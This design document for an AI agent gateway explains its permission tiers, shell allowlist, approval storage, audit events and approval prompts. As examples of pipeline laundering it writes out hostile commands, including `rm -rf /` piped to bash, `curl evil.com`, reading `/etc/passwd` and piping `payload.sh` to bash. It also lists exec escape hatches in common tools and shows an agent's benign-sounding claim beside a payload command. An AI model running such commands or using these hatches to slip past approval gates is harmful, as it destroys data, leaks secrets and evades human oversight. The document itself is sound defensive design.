# Permissions and Identity

How Wirken maps platform user identity to authorization decisions. This doc is split into two sections: **What exists today** describes current code behavior, **Planned** describes the intended direction that is not yet implemented.

If you are deploying Wirken for a team, read both sections before designing your authorization model. The gap between them is load-bearing.

## What exists today

### Three-tier permission model, scoped per agent

Every tool action falls into one of three tiers:

- **Tier 1, always allowed.** Workspace file access, channel converse, web search, and the `http_request` built-in. Tier 1 on `http_request` means it adds no prompt; authorization is the skill's own `permissions` block, enforced as hard refusals at the gate and by `EgressClient`.
- **Tier 2, first-use approval with a 30-day expiry.** External file access (per path), cross-conversation message, and a small curated allowlist of shell-inspection verbs (see below). Everything else that would have been Tier 2 under a denylist model is Tier 3 instead.
- **Tier 3, always prompt.** Destructive file operations, network requests (per domain), credential access, cron create, MCP tool calls, cross-channel memory reads, imported-archive reads and searches, any unregistered tool name, and every shell verb outside the Tier 2 allowlist. Skill installation is not on this list and is not tier-gated: `Action::SkillInstall` was removed because the CLI install path never reached it, and installs gate on signature verification instead.

### Shell exec allowlist

Shell exec is Tier 2 only for verbs on an explicit allowlist:

```
ls cat head tail grep diff cmp stat file wc tree
readlink realpath basename dirname
pwd whoami id uname hostname date echo printf which type
```

Every verb is pure inspection, identity, or path math with no documented exec escape hatch. Every other exec prefix is Tier 3 and prompts on each invocation. That includes shell wrappers (`sh`, `bash`, `env`, `xargs`, ...), language interpreters that can eval (`python -c`, `node -e`, `perl -e`, `ruby -e`, `lua`, `awk`, `sed` with GNU `s///e`), build / deploy tools (`make`, `cargo`, `docker`, `kubectl`, `git`), and exec-hatch-bearing inspection tools (`rg --pre`, `sort --compress-program`, `find -exec`, `less`/`more`/`man` via `!` and `$PAGER`).

The allowlist is curated in `crates/gateway/src/permissions.rs::TIER2_ALLOWLIST`. Adding a verb requires reviewing its man page for exec escapes of the kinds listed above.

Matching is on the canonical form of the first whitespace token. A bare token keeps its lexical form, so `LS` matches `ls`. A token carrying a path separator is resolved on the filesystem first and classified on the real file's basename (`resolve_exec_pattern`, `crates/agent/src/tool.rs`), so `/usr/bin/ls` matches `ls`, `./ls` matches `ls` only when it resolves to a file named `ls`, a symlink named `ls` pointing at `bash` lands on Tier 3, and a path that does not resolve falls to the Tier 3 sentinel. The basename is then lowercased (`canonical_exec_prefix`, `crates/gateway/src/permissions.rs`).

### Pipeline / chain laundering

Token-prefix matching alone would let an allowlisted lead verb hand control to a non-allowlisted one downstream of the tier check: `echo "rm -rf /" | bash`, `pwd && curl evil.com`, `cat /etc/passwd > /tmp/leak`, or any multi-line command body fed to a shell. Before tier classification, `tool_to_action` scans the raw command for shell metacharacters (`| ; & $( ` `` ` ` `` ` > < \n`); any presence forces a sentinel pattern (`:pipeline:`) that cannot match the allowlist, so the action lands on Tier 3 and prompts on every invocation. `&&`, `||`, `>>`, `<<` are covered by their single-character prefixes.

Edge case not handled here: a bare shell binary as argv (`bash` alone, no metacharacters, no script argument) executes whatever stdin is piped to it. argv-only inspection cannot see the stdin source. In practice the producer would itself contain a metacharacter and be caught by this list; pure argv-only `bash` with externally-attached stdin is not a shape the agent can produce through `exec`.

### Where approvals live

Approvals are stored in `~/.wirken/permissions.db` keyed on `(action_key, agent_id)`. The `action_key` for a shell exec is the canonicalized prefix, so `ShellExec { pattern: "ls -la /" }` stores `shell:ls`. The argument tail is not part of the key; a single `shell:ls` approval applies to every later `ls`-prefixed invocation until its window closes.

On open, `PermissionStore::sweep_stale_grants` removes every row the gate cannot act on: keys that are not storable under the current tier model (including `shell:<prefix>` rows whose prefix is no longer Tier 2 eligible, such as `shell:git`, `shell:kubectl`, `shell:make`) and grants whose window has closed. Operators see a single log line at startup counting each kind. The gate would have ignored those rows anyway; the sweep keeps `wirken permissions list` honest. See "Rows an upgrade leaves behind" below.

`wirken permissions list --agent work` prints all approvals for an agent. `wirken permissions revoke <key> --agent work` removes one.

### Every action keys under a namespace

An action key is what the gate matches, what a stored grant is recorded
under, what the approval prompt shows, and what every denial row carries.
Each `Action` variant maps to one explicitly:

| Namespace | From |
| --- | --- |
| `shell:<verb>` | `ShellExec`, with the command canonicalised to its verb. A command carrying a shell metacharacter collapses to the sentinel `shell::pipeline:`. |
| `file:<path>` | `ExternalFileAccess` |
| `cross-conversation` | `CrossConversationMessage` |
| `mcp:<tool>` | `McpToolCall` |
| `tool:<name>` | `UnknownTool` |
| `cross_channel_memory:<from>` | `CrossChannelMemoryRead` |
| `imported_chat:<source>` | `ImportedChatRead` |
| `imported_search:<source>`, `imported_search_corpus` | `ImportedChatSearch`, scoped and unscoped |
| `network:<domain>` | `NetworkRequest` |
| `workspace_file`, `channel_converse`, `web_search`, `http_request`, `destructive_file_op`, `credential_access`, `cron_create` | The parameterless actions |

Eight of those keyed through the derived `Debug` form until the change
recorded under Unreleased in the changelog, which made the key a Rust
identifier: it moved when a variant was renamed, and
`NetworkRequest` rendered as `NetworkRequest { domain: "x" }`, braces and
quotes included. None of the eight is storable, so no grant was orphaned by
naming them; what changed is the key an operator is shown and the key
written to the chain. A test formats every variant's key and refuses one
containing a brace or a parenthesis.

### Only Tier 2 keys can be stored

`permissions.db` accepts a grant only for an action key that is Tier 2: a shell verb on the Tier 2 allowlist, `file:<path>`, or `cross-conversation`. Every other key is refused at write time.

Tier 3 keys are refused because the gate answers Tier 3 without consulting storage at all, so a stored row would never be read while still listing in `wirken permissions list` as though the operator had pre-approved something. Tier 1 keys are refused for the mirror reason: Tier 1 is allowed without a lookup, so the row is equally inert.

The rule is an allowlist of storable shapes rather than a denylist of unstorable ones. A key namespace added later is refused until it is named here deliberately.

The same allowlist governs session-scoped grants. A session grant is bounded by session lifetime rather than by a window, so it leaves no stale row to mislead `wirken permissions list`, but the gate treats a session hit as allowed, which would make a session-scoped Tier 3 key a standing pre-approval for an action whose whole definition is that it prompts every time. So the write refuses it, and the gate consults the session cache only for Tier 2. "Tier 3 always prompts" therefore holds at both ends: nothing can record such a grant, and a grant recorded some other way would allow nothing.

### Grant expiry

A persisted grant carries an `expires_at`. When the gate reads a grant whose window has closed it drops the row and falls back to prompting, and the action stays at prompt-on-every-call until the operator grants it again.

**Expiry is observed, not scheduled.** Nothing runs at the moment a window closes. A lapse is noticed at one of two points: the next call that consults the grant, or the next time the store is opened, which sweeps lapsed rows (see below). A grant on a key nothing calls, in a `wirken run` daemon that stays up for a week, lapses on paper and is noticed when that daemon restarts. Do not read `PermissionGrantExpired` timestamps as a schedule of when grants ended; read `expired_at` on the row for that, and the row's own `ts` for when it was noticed. The `detected_by` field says which of the two points did the noticing.

The default window is 30 days. To change it, set `default_expiry_days` in `~/.wirken/permissions.json`:

```json
{ "default_expiry_days": 7 }
```

An unreadable, unparseable, or absent file means 30 days, and an unrecognised key is named in a warning and ignored rather than failing startup. A single grant can override the default in either direction:

```
wirken permissions approve shell:ls --agent work --expires-in-days 1
```

The default is what an operator gets when they say nothing, not a ceiling on what they can ask for. Zero days is refused at both levels: it stores a grant that has already expired by the time the gate reads it, which reads as a live grant in `wirken permissions list` while prompting on every call. To stop granting an action, revoke it.

`--expires-in-days` does not apply to `--session` grants and is refused alongside it: a session-scoped grant is cleared on session end, not on a date.

### Rows an upgrade leaves behind

The Tier 2 rule above governs writes. It does nothing about rows already in `permissions.db`, and there are two kinds worth removing:

- Keys that are not storable under the current tier model. Older builds accepted `mcp:`, `tool:`, `wasm:`, `imported_chat:`, `imported_search:` and `imported_search_corpus`, and the Tier 2 flip from a denylist to an allowlist stranded `shell:git`, `shell:kubectl`, `shell:make` and the language interpreters. None of these were ever read by the gate.
- Grants whose window closed with nothing having called them. `check` only drops a lapsed row when something consults it, so a grant on an unused key stays in the table indefinitely.

Both printed in `wirken permissions list` as though they were grants, which is a false floor: the list overstated what was approved.

`PermissionStore::open` sweeps both, so the table is honest from the moment it opens rather than from the first call that happens to touch each key. Each removal gets an audit row (`PermissionGrantPruned` or `PermissionGrantExpired`, see below), and the CLI prints a one-line summary when a sweep removed anything. The sweep is idempotent; a second open reports nothing.

### What the chain records about a grant

Seven events, so a reviewer can tell seven different situations apart.

| Event | Means |
| --- | --- |
| `PermissionApproved` | A grant was written where none existed. Carries the `tier` granted and the `expires_at` written, so the row says what was granted and for how long without a lookup against the store. `approved_by` is the decider's verified identity (a channel approver's platform user id, `operator:<key id>`, `webchat:<label>`), and `approver_display` the unverified name beside it; see [audit-cli.md](audit-cli.md). |
| `PermissionRevoked` | An operator took a grant back. Carries `revoked_by` and the `tier` and `expires_at` the row held, which is the only surviving record of what was removed. |
| `PermissionApprovalRefused` | A decision arrived from a caller the gate would not take it from: another channel's request, or another conversation's. Carries `request_id`, `caller` and `reason`. The attempt is recorded whether or not it succeeded, so enumerating request ids leaves a trail. |
| `PermissionRenewed` | A grant was written over one that was already there. Carries `previous_expires_at` alongside `expires_at`. |
| `PermissionGrantExpired` | A grant was found lapsed and dropped. Carries the `expired_at` the row held. `detected_by: tool_call` means a call hit it, and the tool and tier are on the row; `detected_by: store_open` means the sweep found it, with no tool and no tier because no call was involved. |
| `PermissionGrantPruned` | A grant was dropped because its key is Tier 1 or Tier 3 and the gate could never read it. Nothing ran out. Sweep only. |
| `PermissionDenied` | The call was refused. A denial someone made carries `denied_by` and `denier_display`. |

The store keeps one row per key and renewal overwrites in place, so `previous_expires_at` on a renewal row is the only surviving record of the window that was discarded. A key granted once and renewed twenty times is otherwise indistinguishable from one granted yesterday.

`PermissionGrantExpired` is the row that separates "the operator granted this and the window ran out" from "the operator never granted this". Both reach the agent as the same prompt, and only one is worth investigating.

Operator grants made out of band of any conversation (`wirken permissions approve` without `--session`) are recorded under the `gateway-permissions` sentinel session, alongside the existing `gateway-hooks` and `gateway-mcp` lanes. They do not appear in `wirken sessions list`.

### What an approval prompt shows

The tool name and the tier do not describe the call. The action key is a
classification, not a command: every command carrying a shell
metacharacter collapses to `shell::pipeline:`, so the key alone cannot
tell `cat a | bash` from `cat b | bash`. Every approval surface renders
one card from the fields the gateway sends, the same lines in the same
order with the same labels:

```text
request: agent default requests exec (tier3)
action key: shell::pipeline:
arguments: {"command": "cat ./payload.sh | bash"}
runs: runs in sandbox container (exec_only, read-only root, workspace at /workspace, no network)
runtime: Docker default runtime (runc)
in reply to: summarise the release notes
model's claim (unverified): Just checking the build script so the summary is accurate.
```

- `request`: the agent asking, the tool, and the tier as the gateway
  labels it, in parentheses.
- `action key`: what the gate matched and what a stored grant would be
  recorded under.
- `arguments`: the arguments the model sent, verbatim. This is what will
  run if approved. An action with no call behind it, such as sandbox
  egress asking about a destination the key already names, reads
  `(none; the action key is the whole ask)`.
- `runs`: for an `exec`, where the command runs if approved: a sandbox
  container, with its mode and network, or `runs on this host as
  <user>` under `mode: off`. It is built from the settings the `exec`
  will use, the agent's loaded sandbox configuration and the channel's
  egress policy for the turn, not from `sandbox.json` as it reads now,
  which can have been edited since. The network part is `no network`,
  `network only to <hosts> through the egress proxy`, `network to any
  public host through the egress proxy`, or `unrestricted network` when
  `"network": true` is set and no channel policy applies.
- `runtime`: for an `exec`, the container runtime the gateway's sandbox
  settings give it, in words: `gVisor (runsc)` under `"mode": "gvisor"`,
  `Docker default runtime (runc)` under `exec-only`, `this host, no
  container` under `off`. There is no fallback between them: a `gvisor`
  mode whose `runsc` runtime is missing refuses `exec`. The gateway
  sends the value; a value the surface does not know is shown as sent.
- `in reply to`: the message that triggered the turn.
- `model's claim (unverified)`: what the model said in the same message
  as the call. It is the model's own account and not a description:
  reading it against the arguments is the decision. A surface that can
  style text draws it apart from the lines above, which are what the
  gateway established; one that cannot labels it exactly so. The
  arguments are never labeled a claim.

A line the ask does not have is left out: `runs` and `runtime` for a tool
other than `exec`, `in reply to` for a system-driven turn, the claim for
a model that sent calls and no text. Blank lines are never printed.

Everything on the card except the tier is model output or an inbound
message, so every value is cleaned the same way before it is shown:
escape sequences are stripped, line breaks are folded, and a value past
2000 characters is cut with a marker. An argument cannot repaint the
line above it or write a second line that reads as a label. A literal
`approve? [y/N]:` inside the arguments survives, after `arguments:`,
because it is part of the command being approved.

The surfaces, and what each adds after the card:

- `wirken ask` on the CLI prints the card to stderr, then `approve?
  [y/N]:`.
- `wirken chat` draws the card from the `ApprovalRequest` frame the
  gateway sends the terminal, the claim set apart, then `[y] approve`
  and `[n] refuse` drawn alike.
- WebChat draws the card from the `ApprovalRequest` event on its first
  paint, the claim set apart, then the Approve and Deny buttons. The
  pending queue carries the same fields, so a card restored after a
  browser reload shows what the live one showed.
- `wirken permissions pending show` prints the request id, when it was
  made and its age, then the card.
- Telegram and Signal receive the card in the channel's own text dialect
  (HTML on Telegram, every value escaped; plain text on Signal), then the
  channel's way of deciding: buttons on Telegram, `!approve <prefix>` /
  `!deny <prefix> [reason]` on Signal. These are the two channels `wirken
  run` attaches a channel approval gate to.
- A session on any other channel, Slack included, prompts on the CLI
  surface: the request appears in `wirken permissions pending list` and is
  decided with `wirken permissions approve` or `deny`. Nothing is posted in
  the channel, and a request nobody decides within the CLI gate's timeout
  resolves to deny.

A `wirken lyrik run` asks in a shorter form, because its triggering message
is the staged walk text, which says nothing about the one command being
asked. The prompt is who is asking and the exact command `exec` will run:

```text
wirken lyrik: sink-walk wants to run:
  git log -p -- src/auth.c
approve? [y/N]:
```

The command is cleaned the same way, so it occupies its one line and no
other.

### Platform sender identity is admitted and audited, not authenticated

Each channel adapter extracts the platform sender identity on every inbound message and forwards it to the gateway over the IPC frame:

- **Slack**: `user_id` (e.g., `U04ABCD9`).
- **Teams**: Bot Framework activity sender id. The `tenant_id` is also captured in the message metadata JSON.
- **Matrix**: MXID (e.g., `@alice:matrix.example.com`).

Before anything else, the gateway checks the sender id, and the conversation id, against the inbound sender allowlist for the channel (`InboundGate::check`, `crates/gateway/src/sender_registry.rs`, called from `handle_action` in `crates/cli/src/commands/run.rs`). A message neither admits is dropped before the injection scan, the inbound row, the session and the route, and leaves an `inbound_sender_refused` row instead; a channel with no entries admits nobody. The id is the one the platform reported to the adapter: Wirken trusts the platform's account and does not authenticate the person behind it. See [channels.md](channels.md#who-reaches-the-agent).

For an admitted message, the gateway writes this to the audit log as the `actor_id` of the `message.inbound` event, with `actor_kind: user` (`AuditEvent` in `crates/audit/src/event.rs`, written by `handle_action` in `crates/cli/src/commands/run.rs`). The full event carries actor kind and id, action, target, channel, conversation id (as session), and a detail payload.

Past admission, the sender id does not flow into the permission check. Permission lookups key on `(action_key, agent_id)` only. Consequence: **a Tier 2 approval granted when any user on a channel first triggers an action applies to every user on that channel until the approval expires.** If Alice first runs a `shell:cat` pattern on Slack and approves it, Bob gets the same tool-call approval without being prompted, until that grant's window closes. Only Tier 2 keys are stored, so this covers the allowlisted inspection verbs, `file:<path>` and `cross-conversation`; a Tier 3 verb such as `terraform` prompts on every call whoever ran it first.

This is a real gap if the deployment uses one shared agent across a team. Workarounds today:

- Run separate agents per sensitive user and bind them to per-user conversations (requires manual routing, not intended as a primary model).
- Keep high-blast-radius actions at Tier 3 so every invocation prompts, regardless of prior approval.

### Sub-agent ceilings

A parent's registration declares a `SubagentCeiling` per allowed child (tool
allowlist, max permission tier, max rounds, max runtime), which the LLM cannot
widen. The ceiling and the `spawn_subagent` flow are owned by
[multi-agent.md](multi-agent.md#sub-agent-orchestration).

What belongs here is the gate's half. The gate takes the session id and the
logical agent id as separate arguments: session-scoped grants key on the
session, persisted grants key on the agent. A child's session id is its
parent's with a `#sub-N` suffix and its agent id is whatever config it was
woken as, so neither kind of grant reaches it from its caller.

This used to be one argument. The runtime passed its session id and the store
recovered an agent from it by taking the prefix before the first `/`, which
for a child is the parent's agent id. A child was therefore checked against
its caller's persisted grant set, and its own configured agent id never
reached the store. The tier ceiling narrowed that but did not close it: a
ceiling of `tier2` still admitted every Tier 2 grant the parent held.

Grants do not compose in the other direction either. A child's grant applies
to the child alone, and a parent gains nothing from what its children are
allowed. There is no intersection logic; each agent is checked against itself.

An agent that was never told which logical agent it is gets no persisted
grants and prompts for every Tier 2 action. That is the safe direction, and it
means a caller building an agent directly must name it (`set_agent_id`) right
after constructing it with its permission store, before any action is gated.
The factory does this at wake for every agent it produces, sub-agents included.

### Org-level tool policy

The pulled org config (`wirken setup --org <url>`) deserializes `permissions.allowed_tools`, `permissions.blocked_tools`, and `permissions.sandbox_mode` into `OrgPermissions`. All three are enforced:

- `sandbox_mode`. `apply_org_config` writes `sandbox.json` in the data directory; `wirken run` re-reads it on every gateway start. Valid values are `off`, `exec-only`, and `gvisor`; unknown values fall back to the default (`exec-only`) with a warning.
- `allowed_tools` and `blocked_tools`. Persisted to `tool_policy.json` in the data directory when at least one list is non-empty. `wirken run` loads the file and injects it into every waked agent. The check sits in `crates/agent/src/runtime.rs::execute_tool` ahead of the tier permission check: a call to a name in `blocked_tools` fails before dispatch; a call to a name not in `allowed_tools` fails before dispatch when `allowed_tools` is non-empty; `blocked_tools` wins when a name appears in both. Denials are written to the session log as `PermissionDenied` events with `denial_source: "org_policy"` (`tier` is null for these rows; the org-policy classification lives on `denial_source`, not `tier`).

### Channel process isolation

Each adapter runs in its own OS process with a distinct ed25519 IPC identity. A compromised adapter can only deliver inbound frames for its own channel and request outbound sends for its own channel. It cannot invoke tools directly, cannot read other channels' sessions through the IPC surface, and cannot request other channels' credentials through the IPC surface.

Process isolation is not credential ACL. The vault itself does not enforce per-process access: a process with access to `~/.wirken/vault.db` and the device key can retrieve any credential by name. The isolation is that adapters are spawned with a narrow retrieval pattern (only entries named `{channel}-*`) and run under the wirken daemon's boundary.

## Downstream identity

The gateway acts on a downstream system through a connector identity: a
service account, an API key, a vault-held credential. The downstream sees that
identity and not the person whose message set the action in motion, so it
cannot apply that principal's authorization or record who really acted.

Attribution on Wirken's own chain is closed: `sender_id` rides the LLM call
boundary, so `LlmRequest` and `LlmResponse` carry the platform-side sender
alongside the inbound and tool-facing rows that already did. It is `None` for
operator-originated sessions (CLI, cron, subagent recursion), never an empty
string. Nothing on the wire to the provider carries it.

## Identity scope

Wirken is not an identity provider. It issues no identities, manages no user
accounts, and has no login flow. There is no SAML, no OIDC, no SCIM. Platform
sender identity is checked against the inbound sender allowlist and recorded
on every inbound audit event; it is not an identity Wirken authenticates.
